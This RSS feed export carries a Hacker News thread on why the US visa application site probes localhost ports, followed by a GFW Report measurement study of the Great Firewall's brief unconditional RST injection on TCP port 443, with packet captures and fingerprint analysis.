<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 20 Aug 2025 10:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Why does the US Visa application website do a port-scan of my network? (171 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=44959073</link>
            <guid>44959073</guid>
            <pubDate>Wed, 20 Aug 2025 06:03:03 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=44959073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><tbody><tr id="44959344"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959344" href="https://news.ycombinator.com/vote?id=44959344&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Visa application is riddled with scams. From the simple website that charges you twice the price to websites that will tell you that you were rejected and then fake your documents to get in with your name.
So they're probably trying to see that you're not one of those web servers, a proxy for them or detect some known C2 channels.</p></div></td></tr></tbody></table></td></tr><tr id="44959572"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959572" href="https://news.ycombinator.com/vote?id=44959572&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Another data point - 5he Indian visa system is similar. The official website ending in .gov.in, which is hard to find, offers a visa for $10 and minimal hassle. The scam websites, with better SEO sell the same shit for $80. They’re just proxying your application to the real website and pocketing the difference.</p><p>It would be good if the Indian government could block the scammers but I guess it’s a lower priority for the moment.</p></div></td></tr></tbody></table></td></tr><tr id="44959821"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959821" href="https://news.ycombinator.com/vote?id=44959821&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>&gt; <i>It would be good if the Indian government could block the scammers</i></p><p>Lead poisoning in South Asia: impact of possibly ~9% of GDP</p><p>&gt; <i>The heart and brain diseases it causes - to which children are especially susceptible - accounted for at least 1.4m deaths in the region in 2019. The economic cost is crippling; that year lead poisoning is estimated to have lowered South Asian productivity by the equivalent of 9% of GDP</i></p><p>important cause of lead poisoning in South Asia: the practice of drugging spices:</p><p>&gt; <i>Lead chromate was added to the turmeric to brighten its golden colour and lead oxide gave the chilli powders a rich red hue</i></p><p>...This (ineffective action to curb the phenomenon of food producers that are mass poisoners, with a priority also equivalent to a staggering slice of GDP) should give you a picture.</p><p>--</p><p><a href="https://www.economist.com/leaders/2023/11/02/how-to-stop-turmeric-from-killing-people" rel="nofollow">https://www.economist.com/leaders/2023/11/02/how-to-stop-tur...</a></p><p><a href="https://www.theguardian.com/global-development/2020/dec/24/dangerous-spices-why-indias-cooking-powders-pose-a-risk-of-lead-poisoning" rel="nofollow">https://www.theguardian.com/global-development/2020/dec/24/d...</a></p></div></td></tr></tbody></table></td></tr><tr id="44959800"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959800" href="https://news.ycombinator.com/vote?id=44959800&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Huh, how do you imagine that would work? This "scan" is happening inside client-side javascript, delivering the file through a proxy wouldn't "detect" anything about the proxy.</p></div></td></tr></tbody></table></td></tr><tr id="44959890"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959890" href="https://news.ycombinator.com/vote?id=44959890&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I imagine it may not be a proxy in the true sense, but a headless browser that's "proxying" the application process rather than the network traffic itself.</p></div></td></tr></tbody></table></td></tr><tr id="44959358"><td></td></tr><tr id="44959648"><td></td></tr><tr id="44959218"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959218" href="https://news.ycombinator.com/vote?id=44959218&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Many sites do it .Included in many standard device fingerprinting / anti anonymity SAAS. Ebay facebook etc all do this ! But it looks this is first party to prevent the adblocking of them</p><p>1MB of obfuscated fingerprinting + portscan  +  Webgl  . But oddity this one is trying to find burp suite specific route's.</p></div></td></tr></tbody></table></td></tr><tr id="44959353"><td></td></tr><tr id="44959862"><td></td></tr><tr id="44959391"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959391" href="https://news.ycombinator.com/vote?id=44959391&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>You should actually harden your browser or PC... to block any unwanted requests. Apparently some browser extensions can do that.</p></div></td></tr></tbody></table></td></tr><tr id="44959494"><td></td></tr><tr id="44959346"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959346" href="https://news.ycombinator.com/vote?id=44959346&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I'm using uMatrix and it blocks by default all connections outside the requested site and parent domains. For example, if I request <a href="https://mail.yahoo.com/" rel="nofollow">https://mail.yahoo.com</a>, connections to yimg.com are blocked. I need to manually allow each CDN for each website, so this attack/profiling won't work.</p><p>Using uMatrix was very annoying at first, most websites are broken without their CDNs, but after a few months or so, the whitelist grew and it contains 90% of websites I visit.</p><p>On my system <a href="https://ceac.state.gov/genniv/" rel="nofollow">https://ceac.state.gov/genniv/</a> tries to connect to captcha.com, google-analytics, googletagmanager, 127.0.0.1 and "burp" (a local hostname that doesn't exist in my network). Interestigly, the browser console doesn't list connection attempts to localhost or burp. If I allow 127.0.0.1 and "tcpdump -i lo", I see connections to port 8888, which isn't open.</p></div></td></tr></tbody></table></td></tr><tr id="44959722"><td></td></tr><tr id="44959870"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959870" href="https://news.ycombinator.com/vote?id=44959870&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I reluctantly switched to only uBo because of uM bugs. But the UI/UX is just a huge step backwards to enable mobile usability.</p></div></td></tr></tbody></table></td></tr><tr id="44959450"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959450" href="https://news.ycombinator.com/vote?id=44959450&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>How does uMatrix handle the Facebook tracking pixel, or the replacement which is the Conversions API Gateway?</p><p>This is a container that FB gives you to host that lives under your domain (it can be your main domain) that slurps up user data and sends it to Facebook from the server side. You embed some JS in your website, and they hoover up the data.</p></div></td></tr></tbody></table></td></tr><tr id="44959727"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959727" href="https://news.ycombinator.com/vote?id=44959727&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>It doesn't handle it. Anyway, there's no way to know what a website does on the server site. Even a completely static website could be sending the server logs somewhere.</p><p>There are options to not load JS, images, XMLHttpRequests, frames, cookies, for each site, but it doesn't list individual files.</p></div></td></tr></tbody></table></td></tr><tr id="44959508"><td></td></tr><tr id="44959362"><td></td></tr><tr id="44959442"><td></td></tr><tr id="44959606"><td><table><tbody><tr><td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td><center><a id="up_44959606" href="https://news.ycombinator.com/vote?id=44959606&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>It seems like they only make the localhost requests on your first visit. If you open devtools in incognito mode (or just clear the cookies) before accessing <a href="https://ceac.state.gov/genniv/" rel="nofollow">https://ceac.state.gov/genniv/</a> you should see those 127.0.0.1 attempts as ERR_CONNECTION_REFUSED in the network tab.</p><p>Somewhat more worryingly, Little Snitch doesn't report them at all, though that might just be because they were already blocked at the browser.</p></div></td></tr></tbody></table></td></tr><tr id="44959595"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959595" href="https://news.ycombinator.com/vote?id=44959595&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>The requests are not made, because some operating systems prevent this.</p><p>If you're on OSX, the permission to "discover on the local network" prevents it from happening ( System Settings -&gt; Privacy &amp; Security -&gt; Local Network -&gt; yourbrowser )</p><p>Could also be 'network' permissions on firefox ( Go to Settings &gt; Privacy &amp; Security &gt; Permissions ) which is on a per site level, but iirc that could be set site-wide at some point.</p><p>The other browsers likely have similar configs, but this is what I have found.</p></div></td></tr></tbody></table></td></tr><tr id="44959516"><td></td></tr><tr id="44959795"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959795" href="https://news.ycombinator.com/vote?id=44959795&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Just a little side note - in this context, it makes sense if the website tries to connect to a local port because you might be running a card reader(ie. terminal). This is how it works with some(all?) EU countries that have a chip in their ID cards, or even vehicle registration cards, which you can use to access sensitive information or perform certain administrative tasks on government websites.</p><p>Although, from personal experience, it used to require java and it worked only on internet explorer and since it has been retired and replaced with chromium, i am not sure what is the way to make it work nowadays, as i have not been able to figure out to use it when i needed the last time.</p></div></td></tr></tbody></table></td></tr><tr id="44959817"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959817" href="https://news.ycombinator.com/vote?id=44959817&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>The "port scan" just seems to be a local connection to 127.0.0.1:8888. I don't know what purpose it serves on this page, but our government websites often use this technique to communicate with native software for digitally signing documents.</p><p>Are you seeing connection attempts to other IPs?</p></div></td></tr></tbody></table></td></tr><tr id="44959318"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959318" href="https://news.ycombinator.com/vote?id=44959318&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>&gt; Blocks malicious websites from port-scanning your computer/network</p><p>How does that work? A browser extension can't influence how your router and other machines in your network react to incoming requests.</p></div></td></tr></tbody></table></td></tr><tr id="44959340"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959340" href="https://news.ycombinator.com/vote?id=44959340&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Judging just from the screenshots, it seems it blocks websites from accessing 127.0.0.1 get requests. Not a port scan to the outside, more of what do you have running on the local machine inside your network.</p></div></td></tr></tbody></table></td></tr><tr id="44959370"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959370" href="https://news.ycombinator.com/vote?id=44959370&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>As far as I understand it, it is supposed to be a scan done by the browser on the user's computer, not an external scan, which a browser extension wouldn't be able to detect.</p></div></td></tr></tbody></table></td></tr><tr id="44959700"><td><table><tbody><tr><td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td><center><a id="up_44959700" href="https://news.ycombinator.com/vote?id=44959700&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>I see. So the website would try to access private IP adresses (RFC 1918) by having elements like &lt;iframe src="<a href="http://10.0.0.1/" rel="nofollow">http://10.0.0.1</a>"&gt; in the web site and then the web site would check if the iframe was loaded successfully?</p></div></td></tr></tbody></table></td></tr><tr id="44959877"><td></td></tr><tr id="44959481"><td></td></tr><tr id="44959329"><td></td></tr><tr id="44959304"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959304" href="https://news.ycombinator.com/vote?id=44959304&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Embarrassed to say that I wasn't aware of this practice. Are there malicious uses for this beyond fingerprinting?</p></div></td></tr></tbody></table></td></tr><tr id="44959317"><td></td></tr><tr id="44959492"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959492" href="https://news.ycombinator.com/vote?id=44959492&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Be careful your security tool isn't producing false positives.</p><p>I remember years back when people would run these firewalls and we'd get complaints from home users about normal traffic.</p><p>Thinks like complaints our mail servers was scanning them on port 25 when they sent email.</p></div></td></tr></tbody></table></td></tr><tr id="44959209"><td></td></tr><tr id="44959381"><td><table><tbody><tr><td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td><center><a id="up_44959381" href="https://news.ycombinator.com/vote?id=44959381&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Capturing forensic artifacts of the local network allows a building a bridge strategy for identifying fraudulent networks without requiring knowledge of the path taken from destination to recipient. Other local devices do this and send the network map during a phone home, allowing comparison to a source of truth that is tied almost directly to the person, or group of people.</p><p>There is also a lot of fingerprintable material within such a port scan from clock skew, TCP ISN, and a few other areas.</p><p>You can sieve this quite easily with this available, thanks to Roku's, Phone's, and other things doing this while just sitting locally in a shared collision domain (a digital soldier quartered in every home).</p><p>The metadata node graph of devices locally acts as a unique fingerprint once in RFC1918 space, technically not unique but close enough.</p></div></td></tr></tbody></table></td></tr><tr id="44959511"><td></td></tr><tr id="44959289"><td></td></tr><tr id="44959467"><td><table><tbody><tr><td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td><center><a id="up_44959467" href="https://news.ycombinator.com/vote?id=44959467&amp;how=up&amp;goto=item%3Fid%3D44959073"></a></center></td><td><br>
<div><p>Yeah it should have a fixed header and footer along with a pop-up consent drawer so you can only see 10% of the actual site content.</p><p>So much better.</p><p>Modern web design is a joke.</p></div></td></tr></tbody></table></td></tr><tr id="44959347"><td></td></tr><tr id="44959356"><td></td></tr><tr id="44959694"><td></td></tr></tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Analysis of the GFW's Unconditional Port 443 Block on August 20, 2025 (138 pts)]]></title>
            <link>https://gfw.report/blog/gfw_unconditional_rst_20250820/en/</link>
            <guid>44958621</guid>
            <pubDate>Wed, 20 Aug 2025 04:27:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gfw.report/blog/gfw_unconditional_rst_20250820/en/">https://gfw.report/blog/gfw_unconditional_rst_20250820/en/</a>, See on <a href="https://news.ycombinator.com/item?id=44958621">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

						
						
						
						
						
						

						
						<h2 id="1-introduction">1. Introduction</h2>
<p>Between approximately 00:34 and 01:48 (Beijing Time, UTC+8) on August 20, 2025, the Great Firewall of China (GFW) exhibited anomalous behavior by unconditionally injecting forged TCP <code>RST+ACK</code> packets to disrupt all connections on TCP port 443. This incident caused massive disruption of the Internet connections between China and the rest of the world (<a href="https://t.me/DNSPODT/11175">source1</a> and <a href="https://t.me/zaihuapd/35214">source2</a>).</p>
<p>This report documents our measurements and analysis of this temporary, widespread blocking event. Our primary findings are:</p>
<ol>
<li>The unconditional <code>RST+ACK</code> injections was on TCP port 443, but not on other common ports like 22, 80, 8443.</li>
<li>The unconditional <code>RST+ACK</code> injection disrupted connections both to and from China, but the trigger mechanism was asymmetrical. For traffic originating from inside China, the <code>SYN</code> packet from the client and the <code>SYN+ACK</code> packet could each trigger three injected <code>RST+ACK</code> packets. For traffic to inside China, only the server’s <code>SYN+ACK</code> response, not the client’s <code>SYN</code> packet, could trigger the <code>RST+ACK</code> packets.</li>
<li>The responsible device does not match the fingerprints of any known GFW devices, suggesting that <strong>the incident was caused by either a new GFW device or a known device operating in a novel or misconfigured state</strong>.</li>
</ol>
<p>It is important to note that our analysis was limited by the short duration of the incident (approximately 74 minutes). We encourage others in the community to share their observations to build a more complete picture of this event.</p>
<h2 id="2-triggering-the-blocking">2. Triggering the blocking</h2>
<p>We first confirmed the blocking by sending probes from a vantage points inside of China (AS45090, Tencent Cloud, Beijing), and from multiple vantage points outside of China.</p>
<h3 id="21-inside-out-triggering">2.1 Inside-out triggering</h3>
<p>In particular, we used the following command to try to establish a TCP handshake with a <code>$NON_CN_IP</code>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>nc -vn $NON_CN_IP <span>443</span>
</span></span><span><span>nc: connect to $NON_CN_IP port <span>443</span> <span>(</span>tcp<span>)</span> failed: Connection refused
</span></span></code></pre></div><p>We simultaneously used <code>tcpdump</code> to capture traffic:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>tcpdump -n host $NON_CN_IP
</span></span></code></pre></div><p>It appears that the <code>SYN</code> packet triggered three forged <code>RST+ACK</code> packets, each with a relative sequence number <code>0</code>, as well as incremental TCP window sizes of <code>1980</code>, <code>1981</code>, and <code>1982</code>.</p>
<p>And the <code>SYN+ACK</code> packet sent by the server also triggered three <code>RST+ACK</code> packets, each with a relative sequence number <code>1</code>, as well as incremental TCP window sizes of <code>3293</code>, <code>3294</code>, and <code>3295</code>.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo tcpdump -n host $NON_CN_IP
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span><span><span>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span><span><span>01:31:07.153262 IP $CN_IP.52596 &gt; $NON_CN_IP.443: Flags [S], seq 3193349615, win 64240, options [mss 1460,sackOK,TS val 318868316 ecr 0,nop,wscale 7], length 0
</span></span><span><span>01:31:07.159991 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 0, ack 3193349616, win 1980, length 0
</span></span><span><span>01:31:07.159991 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 0, ack 1, win 1981, length 0
</span></span><span><span>01:31:07.160021 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 0, ack 1, win 1982, length 0
</span></span><span><span>01:31:07.274422 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [S.], seq 2837031664, ack 3193349616, win 65160, options [mss 1424,sackOK,TS val 80839422 ecr 318868316,nop,wscale 7], length 0
</span></span><span><span>01:31:07.274442 IP $CN_IP.52596 &gt; $NON_CN_IP.443: Flags [R], seq 3193349616, win 0, length 0
</span></span><span><span>01:31:07.278233 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 1, ack 1, win 3295, length 0
</span></span><span><span>01:31:07.278233 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 1, ack 1, win 3293, length 0
</span></span><span><span>01:31:07.278233 IP $NON_CN_IP.443 &gt; $CN_IP.52596: Flags [R.], seq 1, ack 1, win 3294, length 0
</span></span></code></pre></div><h3 id="22-outside-in-triggering">2.2 Outside-in triggering</h3>
<p>Similarly, the <code>RST+ACK</code> packets can be triggered from outside of China. The <code>$CN_IP</code> is an IP address of <code>baidu.com</code>:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>11:44:41.194853 IP (tos 0x0, ttl 64, id 48747, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    192.168.0.162.34500 &gt; $CN_IP.443: Flags [S], cksum 0x418a (incorrect -&gt; 0x252a), seq 3455861170, win 64240, options [mss 1460,sackOK,TS val 134891089 ecr 0,nop,wscale 7], length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 46, id 48747, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [S.], cksum 0xd4a2 (correct), seq 1580408478, ack 3455861171, win 8192, options [mss 1452,sackOK,nop,nop,nop,nop,nop,nop,nop,nop,nop,nop,nop,wscale 5], length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 96, id 40305, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [R.], cksum 0x515b (correct), seq 1, ack 1, win 2072, length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 97, id 39808, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [R.], cksum 0x515a (correct), seq 1, ack 1, win 2073, length 0
</span></span><span><span>11:44:41.440817 IP (tos 0x0, ttl 98, id 38891, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.443 &gt; 192.168.0.162.34500: Flags [R.], cksum 0x5159 (correct), seq 1, ack 1, win 2074, length 0
</span></span><span><span>11:44:41.440901 IP (tos 0x0, ttl 64, id 48748, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    192.168.0.162.34500 &gt; $CN_IP.443: Flags [.], cksum 0x4176 (incorrect -&gt; 0x5781), seq 1, ack 1, win 502, length 0
</span></span></code></pre></div><p>The client outside of China received only three TCP <code>RST+ACK</code> packets, not six. The relative sequence number <code>1</code> suggests that the GFW was triggered by the <code>SYN+ACK</code> packet responded by the Chinese server, and the SYN packet didn’t trigger the blocking. Indeed, we couldn’t trigger the blocking when the sending <code>SYN</code> packets to a Chinese IP address within the same <code>/24</code> subnet as <code>$CN_IP</code> which didn’t have an open port (and thus did not send any <code>SYN+ACK</code> packet back to the client.)</p>
<h3 id="23-affected-ports">2.3 Affected ports</h3>
<p>The <code>RST+ACK</code> injection was confirmed to be specific to TCP port <code>443</code>. We conducted a partial port scan from a machine inside China (AS45090, Tencent Cloud, Beijing) to an external IP address. We confirmed that other common ports, including 1-72, 22, 80, 444, and 8443, were not affected and did not receive a TCP RST.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>nping -4 -c <span>0</span> --tcp-connect $NON_CN_IP -p 1-65535
</span></span></code></pre></div><p>We also ran a scan to probe all ports from 1-65535, but by the time we ran it at 01:48 CST 2025-08-20, we could no longer trigger the blocking anymore:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>sudo nmap -sS -p- $NON_CN_IP -oN scan_results.txt -T4 --min-rate <span>10000</span> -Pn
</span></span></code></pre></div><h2 id="3-attribution-and-device-fingerprinting">3. Attribution and Device Fingerprinting</h2>
<p>The Great Firewall of China (GFW) is not a single entity but a complex system composed of various network devices that perform censorship. Previous research has established that different components, such as those responsible for HTTP Host-based and TLS SNI-based filtering, exhibit unique packet-level fingerprints when injecting TCP RST packets. The goal of this analysis was to identify which specific GFW component was responsible for the anomalous behavior observed during the incident.</p>
<p>To fingerprint the responsible device, after the incident had concluded, we sent probes from the vantage point in China to the IP address that triggered the unconditional RSTs. We used the same destination IP address so that our probe packets would be more likely to traverse the same network path and interact with the same set of censorship middleboxes, allowing for a consistent fingerprint analysis.</p>
<p>Our analysis of the probe results revealed that <strong>no captured packet fingerprint exactly matched the characteristics observed during the incident—specifically</strong>.</p>
<p>Since the unconditionally injection contain three RST+ACK packets with the IP Flag <code>DF</code> (<code>Don't Fragment</code>) on, they are similar, but not identical, to <code>MB-1</code> identified by Niere et al. (see <a href="https://censorbib.nymity.ch/pdf/Niere2025a.pdf#page=8">Figure 4</a>); and they are also similar to, but not identical to, <code>GFW (II)</code> identified by Wu et al. (see <a href="https://gfw.report/publications/sp25/en/#tbl:4-injection-behaviors-packet-fingerprints">Table 4</a>).</p>
<p>However, a key difference exists: the known middlebox injector sends three <strong>identical</strong> TCP <code>RST+ACK</code> packets. In contrast, the packets observed during this incident contained fields that were clearly incremental, not identical. This discrepancy suggests that <strong>the incident was caused by either a previously uncatalogued GFW device or a known device operating in a novel or misconfigured state.</strong></p>
<h3 id="31-fingerprints-of-gfws-unconditional-rstack-packets">3.1 Fingerprints of GFW’s Unconditional RST+ACK packets</h3>
<p>The unconditional RST+ACK packets comes in three packets, with an incrementally increasing IP TTL and an incrementally increasing TCP window size. We limited data, we were not able to identify the IP ID of it.</p>
<table>
  <thead>
      <tr>
          <th>IP Flag</th>
          <th>IP ID</th>
          <th>IP TTL</th>
          <th>TCP Relative Sequence Number</th>
          <th>TCP Flags</th>
          <th>TCP Window Size</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Don’t Fragment</td>
          <td>40305 (0x9D71)</td>
          <td>96</td>
          <td>1</td>
          <td>RST+ACK</td>
          <td>2072</td>
      </tr>
      <tr>
          <td>Don’t Fragment</td>
          <td>39808 (0x9B80)</td>
          <td>97</td>
          <td>1</td>
          <td>RST+ACK</td>
          <td>2073</td>
      </tr>
      <tr>
          <td>Don’t Fragment</td>
          <td>38891 (0x97E3)</td>
          <td>98</td>
          <td>1</td>
          <td>RST+ACK</td>
          <td>2074</td>
      </tr>
  </tbody>
</table>
<p><em>Table 1: Characteristics of Unconditionally Injected TCP RST Packets</em></p>
<h3 id="32-fingerprints-of-the-rst-packets-by-gfws-http-host-based-censorship-devices">3.2 Fingerprints of the RST packets by GFW’s HTTP Host-based censorship devices</h3>
<div><pre tabindex="0"><code data-lang="sh"><span><span>curl --resolve youtube.com:80:$NON_CN_IP http://youtube.com
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span><span><span>04:27:09.790274 IP (tos 0x0, ttl 64, id 12103, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    $CN_IP.51506 &gt; $NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [S], cksum 0x630f (correct), seq 3187873750, win 64240, options [mss 1460,sackOK,TS val 329430953 ecr 0,nop,wscale 7], length 0
</span></span><span><span>04:27:09.919296 IP (tos 0x68, ttl 251, id 0, offset 0, flags [DF], proto TCP (6), length 60)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [S.], cksum 0xaf88 (correct), seq 155578285, ack 3187873751, win 65160, options [mss 1424,sackOK,TS val 2237542832 ecr 329430953,nop,wscale 7], length 0
</span></span><span><span>04:27:09.919331 IP (tos 0x0, ttl 64, id 12104, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    $CN_IP.51506 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [.], cksum 0xda42 (correct), ack 1, win 502, options [nop,nop,TS val 329431082 ecr 2237542832], length 0
</span></span><span><span>04:27:09.919414 IP (tos 0x0, ttl 64, id 12105, offset 0, flags [DF], proto TCP (6), length 127)
</span></span><span><span>    $CN_IP.51506 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [P.], cksum 0x0926 (correct), seq 1:76, ack 1, win 502, options [nop,nop,TS val 329431082 ecr 2237542832], length 75: HTTP, length: 75
</span></span><span><span>        GET / HTTP/1.1
</span></span><span><span>        Host: youtube.com
</span></span><span><span>        User-Agent: curl/7.81.0
</span></span><span><span>        Accept: */*
</span></span><span><span>
</span></span><span><span>04:27:09.923159 IP (tos 0x68, ttl 251, id 31725, offset 0, flags [none], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R], cksum 0xc7c6 (correct), seq 155578286, win 42571, length 0
</span></span><span><span>04:27:09.924494 IP (tos 0x68, ttl 251, id 45284, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R.], cksum 0x9162 (correct), seq 1, ack 76, win 1658, length 0
</span></span><span><span>04:27:09.924494 IP (tos 0x68, ttl 251, id 45284, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R.], cksum 0x9162 (correct), seq 1, ack 76, win 1658, length 0
</span></span><span><span>04:27:09.924510 IP (tos 0x68, ttl 251, id 45284, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [R.], cksum 0x9162 (correct), seq 1, ack 76, win 1658, length 0
</span></span><span><span>04:27:10.048400 IP (tos 0x68, ttl 251, id 34753, offset 0, flags [DF], proto TCP (6), length 52)
</span></span><span><span>    a$NON_CN_IP.deploy.static.akamaitechnologies.com.http &gt; $CN_IP.51506: Flags [.], cksum 0xd96f (correct), ack 76, win 509, options [nop,nop,TS val 2237542961 ecr 329431082], length 0
</span></span><span><span>04:27:10.048426 IP (tos 0x68, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
</span></span><span><span>    $CN_IP.51506 &gt; a$NON_CN_IP.deploy.static.akamaitechnologies.com.http: Flags [R], cksum 0x90e0 (correct), seq 3187873826, win 0, length 0
</span></span></code></pre></div><h3 id="33-fingerprints-of-the-rst-packets-by-gfws-tls-sni-based-censorship-devices">3.3 Fingerprints of the RST packets by GFW’s TLS SNI-based censorship devices</h3>
